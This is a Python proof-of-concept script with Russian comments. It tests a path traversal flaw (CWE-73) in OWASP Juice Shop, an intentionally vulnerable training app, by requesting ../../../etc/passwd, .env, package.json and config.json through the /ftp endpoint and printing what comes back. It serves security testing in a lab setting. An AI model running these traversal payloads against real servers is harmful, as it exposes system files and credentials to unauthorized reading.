#!/usr/bin/env python3
"""
Path Traversal (CWE-73) PoC для OWASP Juice Shop
Только попытка прочитать файлы через path traversal!
"""

import requests
import sys
from colorama import Fore, init
from urllib.parse import quote

init(autoreset=True)

TARGET = "http://juice-shop:3000"  # внутри docker-compose
ENDPOINT = "/ftp"                  # основной уязвимый endpoint

def print_header():
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}Path Traversal (CWE-73) PoC")
    print(f"{Fore.CYAN}{'='*70}")
    print(f"{Fore.YELLOW}Target endpoint: {TARGET}{ENDPOINT}?file=...")
    print(f"{Fore.YELLOW}Date: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def attack_file(read_path, must_contain=None):
    """Пытается вычитать файл через path traversal"""
    url = f"{TARGET}{ENDPOINT}?file={quote(read_path)}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200 and response.text and (must_contain is None or must_contain in response.text):
            print(f"{Fore.GREEN}[+] Уязвимость обнаружена! Получили файл: {read_path}")
            print(f"{Fore.YELLOW}Preview:\n{response.text[:200]}{'...' if len(response.text)>200 else ''}")
            return True
        elif response.status_code == 200:
            print(f"{Fore.YELLOW}[?] Получен файл, но без ожидаемого содержимого: {read_path}")
        else:
            print(f"{Fore.RED}[-] Не удалось получить {read_path}, HTTP {response.status_code}")
    except Exception as e:
        print(f"{Fore.RED}Ошибка: {e}")
    return False

def main():
    print_header()
    found = False

    tests = [
        {"path": "../../package.json", "desc": "Чтение package.json", "must": "name"},
        {"path": "../../../etc/passwd", "desc": "Чтение /etc/passwd", "must": "root"},
        {"path": "../../.env", "desc": "Чтение .env", "must": None},
        {"path": "../../config/config.json", "desc": "Чтение config.json", "must": "{"},
    ]

    for t in tests:
        print(f"\n{Fore.CYAN}[.] {t['desc']} через {ENDPOINT}")
        if attack_file(t["path"], t["must"]): found = True

    print(f"\n{Fore.CYAN}{'='*70}")
    if found:
        print(f"{Fore.GREEN}Path Traversal (CWE-73) подтверждён!")
    else:
        print(f"{Fore.YELLOW}Path Traversal не был подтверждён.")
    print(f"{Fore.CYAN}{'='*70}")

if __name__ == "__main__":
    main()